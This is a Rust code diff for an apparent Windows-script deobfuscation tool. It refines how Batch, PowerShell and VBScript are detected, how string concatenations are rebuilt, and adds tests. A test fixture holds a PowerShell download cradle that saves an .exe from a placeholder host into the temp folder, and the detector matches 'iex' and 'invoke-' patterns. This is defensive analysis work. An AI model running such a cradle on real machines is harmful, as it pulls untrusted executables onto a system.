@@ -128,16 +128,169 @@ impl WinScriptRecovery {
 #[must_use]
 pub fn classify(text: &str) -> Option<WinScriptLang> {
     let lower: String = text.to_ascii_lowercase();
-    if is_strong_batch(&lower) {
+    let language: WinScriptLang = classify_markers(&lower)?;
+    if has_foreign_shebang(&lower) {
+        return None;
+    }
+    let foreign: usize = lower
+        .lines()
+        .filter(|line: &&str| is_foreign_statement(line.trim()))
+        .count();
+    if foreign == 0 {
+        return Some(language);
+    }
+    let evidence: usize = lower
+        .lines()
+        .filter(|line: &&str| is_statement_of(language, line.trim()))
+        .count();
+    (evidence > foreign).then_some(language)
+}
+
+fn has_foreign_shebang(lower: &str) -> bool {
+    lower.strip_prefix("#!").is_some_and(|line: &str| {
+        let interpreter: &str = line.lines().next().unwrap_or_default();
+        !interpreter.contains("pwsh") && !interpreter.contains("powershell")
+    })
+}
+
+fn is_foreign_statement(line: &str) -> bool {
+    const PREFIXES: &[&str] = &[
+        "import ",
+        "from __future__",
+        "def ",
+        "async def ",
+        "elif ",
+        "except ",
+        "except:",
+        "try:",
+        "finally:",
+        "if __name__ ==",
+        "using system",
+        "namespace ",
+        "package ",
+        "public class ",
+        "public static ",
+        "private static ",
+        "internal class ",
+        "static void ",
+        "require '",
+        "require \"",
+        "require_relative ",
+        "puts ",
+        "attr_accessor ",
+        "export ",
+        "module.exports",
+        "console.log(",
+        "#include ",
+        "int main(",
+    ];
+    if PREFIXES
+        .iter()
+        .any(|prefix: &&str| line.starts_with(prefix))
+    {
+        return true;
+    }
+    let python_block: bool =
+        (line.starts_with("class ") || line.starts_with("with ")) && line.ends_with(':');
+    let python_import: bool = line.starts_with("from ") && line.contains(" import ");
+    let js_binding: bool = (line.starts_with("const ") || line.starts_with("let "))
+        && (line.ends_with(';') || line.contains("require("));
+    python_block || python_import || js_binding || line.contains(" => ")
+}
+
+fn is_statement_of(language: WinScriptLang, line: &str) -> bool {
+    match language {
+        WinScriptLang::PowerShell => {
+            line.starts_with('$')
+                || line.starts_with("param(")
+                || line.starts_with("function ")
+                || line.contains("]::")
+                || line.contains("-object")
+                || line.starts_with("iex")
+                || line.contains("|iex")
+                || line.contains("| iex")
+                || line.contains("invoke-")
+                || starts_with_cmdlet(line)
+        }
+        WinScriptLang::Batch => {
+            const COMMANDS: &[&str] = &[
+                "@echo", "echo ", "set ", "setlocal", "endlocal", "goto ", "call ", "rem ", "::",
+                "if ", "for ", "copy ", "del ", "start ", "cmd ", "exit ", "pause", "shift",
+            ];
+            COMMANDS
+                .iter()
+                .any(|command: &&str| line.starts_with(command))
+                || (line.starts_with(':') && line.len() > 1)
+                || has_batch_var_expansion(line)
+        }
+        WinScriptLang::VbScript => {
+            const KEYWORDS: &[&str] = &[
+                "dim ",
+                "redim ",
+                "set ",
+                "sub ",
+                "end sub",
+                "function ",
+                "end function",
+                "end if",
+                "on error ",
+                "option explicit",
+                "wscript.",
+                "msgbox",
+                "executeglobal",
+                "call ",
+                "next",
+                "wend",
+            ];
+            KEYWORDS
+                .iter()
+                .any(|keyword: &&str| line.starts_with(keyword))
+                || line.contains("createobject(")
+        }
+    }
+}
+
+fn starts_with_cmdlet(line: &str) -> bool {
+    let token: &str = line.split_whitespace().next().unwrap_or_default();
+    let Some((verb, noun)): Option<(&str, &str)> = token.split_once('-') else {
+        return false;
+    };
+    matches!(
+        verb,
+        "get"
+            | "set"
+            | "new"
+            | "invoke"
+            | "start"
+            | "stop"
+            | "out"
+            | "where"
+            | "foreach"
+            | "select"
+            | "add"
+            | "remove"
+            | "import"
+            | "export"
+            | "convert"
+            | "convertto"
+            | "convertfrom"
+            | "write"
+            | "read"
+    ) && !noun.is_empty()
+        && noun.bytes().all(|byte: u8| byte.is_ascii_alphabetic())
+}
+
+fn classify_markers(lower: &str) -> Option<WinScriptLang> {
+    if is_strong_batch(lower) {
         return Some(WinScriptLang::Batch);
     }
-    if is_powershell(&lower) {
+    if is_powershell(lower) {
         return Some(WinScriptLang::PowerShell);
     }
-    if is_vbscript(&lower) {
+    if is_vbscript(lower) {
         return Some(WinScriptLang::VbScript);
     }
-    if is_batch(&lower) {
+    if is_batch(lower) {
         return Some(WinScriptLang::Batch);
     }
     None
@@ -769,44 +922,62 @@ fn emit_single_quoted(inner: &str) -> String {
     out
 }
 
+fn emit_quoted(inner: &str, quote: char) -> String {
+    let mut out: String = String::with_capacity(inner.len() + 2);
+    out.push(quote);
+    for c in inner.chars() {
+        if c == quote {
+            out.push(quote);
+        }
+        out.push(c);
+    }
+    out.push(quote);
+    out
+}
+
 #[must_use]
 pub fn rebuild_string_concat(text: &str) -> Option<String> {
     let mut out: String = String::with_capacity(text.len());
     let bytes: &[u8] = text.as_bytes();
+    let mut run_start: usize = 0usize;
     let mut i: usize = 0usize;
     let mut changed: bool = false;
     while i < bytes.len() {
-        let c: u8 = bytes[i];
-        if c == b'\'' || c == b'"' {
-            let Some((literal, end)): Option<(String, usize)> = read_quoted(bytes, i, c) else {
-                out.push(c as char);
-                i += 1;
-                continue;
-            };
-            let mut combined: String = literal;
-            let mut cursor: usize = end;
-            loop {
-                let after: usize = skip_concat_plus(bytes, cursor);
-                if after == cursor {
-                    break;
-                }
-                let next_quote: u8 = bytes[after];
-                let Some((next_lit, next_end)): Option<(String, usize)> =
-                    read_quoted(bytes, after, next_quote)
-                else {
-                    break;
-                };
-                combined.push_str(&next_lit);
-                cursor = next_end;
-                changed = true;
-            }
-            out.push_str(&emit_single_quoted(&combined));
-            i = cursor;
-        } else {
-            out.push(c as char);
+        let quote: u8 = bytes[i];
+        if quote != b'\'' && quote != b'"' {
             i += 1;
+            continue;
         }
+        let Some((literal, end)): Option<(String, usize)> = read_quoted(bytes, i, quote) else {
+            i += 1;
+            continue;
+        };
+        let mut combined: String = literal;
+        let mut parts: usize = 1usize;
+        let mut cursor: usize = end;
+        loop {
+            let after: usize = skip_concat_plus(bytes, cursor);
+            if after == cursor || bytes.get(after) != Some(&quote) {
+                break;
+            }
+            let Some((next_lit, next_end)): Option<(String, usize)> =
+                read_quoted(bytes, after, quote)
+            else {
+                break;
+            };
+            combined.push_str(&next_lit);
+            parts += 1;
+            cursor = next_end;
+        }
+        if parts > 1 {
+            out.push_str(text.get(run_start..i).unwrap_or_default());
+            out.push_str(&emit_quoted(&combined, char::from(quote)));
+            run_start = cursor;
+            changed = true;
+        }
+        i = cursor;
     }
+    out.push_str(text.get(run_start..).unwrap_or_default());
     changed.then_some(out)
 }
 
@@ -815,18 +986,19 @@ fn read_quoted(bytes: &[u8], start: usize, quote: u8) -> Option<(String, usize)>
         return None;
     }
     let mut s: String = String::new();
+    let mut run_start: usize = start + 1;
     let mut i: usize = start + 1;
     while i < bytes.len() {
-        let c: u8 = bytes[i];
-        if c == quote {
+        if bytes[i] == quote {
+            s.push_str(std::str::from_utf8(bytes.get(run_start..i)?).ok()?);
             if i + 1 < bytes.len() && bytes[i + 1] == quote {
-                s.push(quote as char);
+                s.push(char::from(quote));
                 i += 2;
+                run_start = i;
                 continue;
             }
             return Some((s, i + 1));
         }
-        s.push(c as char);
         i += 1;
     }
     None
@@ -1722,6 +1894,25 @@ mod tests {
     use super::*;
 
     #[test]
+    fn string_concat_keeps_single_literals_and_their_quoting() {
+        assert_eq!(
+            rebuild_string_concat("MsgBox \"Python's naïve\"\n' a comment"),
+            None,
+            "nothing is concatenated, so nothing may be rewritten"
+        );
+        assert_eq!(
+            rebuild_string_concat("x = \"say \"\"hi\"\" \" & \"日本\""),
+            Some("x = \"say \"\"hi\"\" 日本\"".to_owned()),
+            "a double-quoted chain stays double-quoted"
+        );
+        assert_eq!(
+            rebuild_string_concat("x = 'a' + \"b\""),
+            None,
+            "mixed quotes are left alone"
+        );
+    }
+
+    #[test]
     fn char_code_rebuild_keeps_non_ascii_text_intact() {
         let rebuilt: String =
             rebuild_char_codes("x = \"héllo\" + Chr(72) + Chr(105)").expect("a run was rebuilt");
@@ -1802,6 +1993,64 @@ mod tests {
             classify(PYTHON),
             None,
             "python source carrying a xor caret and the dim and set substrings must not be claimed as a windows script"
+        );
+    }
+
+    #[test]
+    fn classify_defers_source_of_other_languages_carrying_script_markers() {
+        const CSHARP: &str = "using System;
+             namespace Loader
+             {
+                 public class Program
+                 {
+                     public static void Main(string[] args)
+                     {
+                         byte[] raw = Convert.FromBase64String(args[0]);
+                         Console.WriteLine(raw.Length);
+                     }
+                 }
+             }
+";
+        const PYTHON_REGEX: &str = "import re
+             from pathlib import Path
+             PATTERN = re.compile(r\"^(\\w+)=(.*)$\")
+             def parse(line):
+                 return PATTERN.match(line)
+";
+        const RUBY: &str = "require 'base64'
+             def decode(blob)
+               Base64.decode64(blob)
+             end
+             puts decode(ARGV[0]).sub(/^(ab)/, '')
+";
+        const JAVASCRIPT: &str = "const fs = require('fs');
+             const pick = (s) => s.replace(/^(a|b)/, '');
+             module.exports = { pick };
+";
+        const NODE_SHEBANG: &str = "#!/usr/bin/env node
+console.log(\"echo hello ^& echo world\");
+";
+        for (name, source) in [
+            ("C#", CSHARP),
+            ("Python", PYTHON_REGEX),
+            ("Ruby", RUBY),
+            ("JavaScript", JAVASCRIPT),
+            ("a node script", NODE_SHEBANG),
+        ] {
+            assert_eq!(
+                classify(source),
+                None,
+                "{name} source must be left to its own detector"
+            );
+        }
+        const POWERSHELL_WITH_IMPORT: &str = "Import-Module BitsTransfer
+             $url = 'http://example.invalid/a'
+             $client = New-Object Net.WebClient
+             $client.DownloadFile($url, \"$env:TEMP\\a.exe\")
+";
+        assert_eq!(
+            classify(POWERSHELL_WITH_IMPORT),
+            Some(WinScriptLang::PowerShell)
         );
     }
 
